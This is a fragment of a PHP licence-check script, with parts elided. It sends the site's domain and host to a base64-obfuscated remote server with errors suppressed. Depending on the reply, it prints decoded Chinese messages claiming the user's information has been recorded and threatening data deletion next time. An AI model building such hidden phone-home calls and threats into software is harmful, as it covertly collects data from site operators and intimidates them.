<?php
error_reporting(0);
function getTopDomainhuocommon(){
		...
		$topleveldomaindb=array('com','club','com.cn','pw','cn','edu','gov','int','mil','net','org','biz','info','pro','name','museum','coop','aero','xxx','idv','mobi','cc','me');
		$str='';
...
$domain=getTopDomainhuocommon();
$real_domain=$domain;
$check_host='http://'.base64_decode('eXVuLmlkei5wdy9vMm8vdXBkYXRlLnBocD9hPWNsaWVudF9jaGVjayZ1PQ==').$domain.'&h='.$host;
$check_info=file_get_contents($check_host);
if($check_info=='1'){
   echo base64_decode('5Z+f5ZCN5pyq5o6I5p2D77yM5o6I5p2D57O757uf5bey57uP6K6w5b2V5oKo55qE5ZCE57G75L+h5oGv77yM6K+36IGU57O7cXE6MjYzMTIyNjM0LOS4i+asoeWwhuWBmuaVsOaNrua4hemZpOWkhOeQhg==');
   die;
}elseif($check_info=='2'){
   echo base64_decode('5Z+f5ZCN5bey57uP5Yiw5pyf77yM5o6I5p2D57O757uf5bey57uP6K6w5b2V5oKo55qE5ZCE57G75L+h5oGv77yM6K+36IGU57O7cXE6MjYzMTIyNjM0LOS4i+asoeWwhuWBmuaVsOaNrua4hemZpOWkhOeQhg==');
   die;
}
if($check_info!=='0')
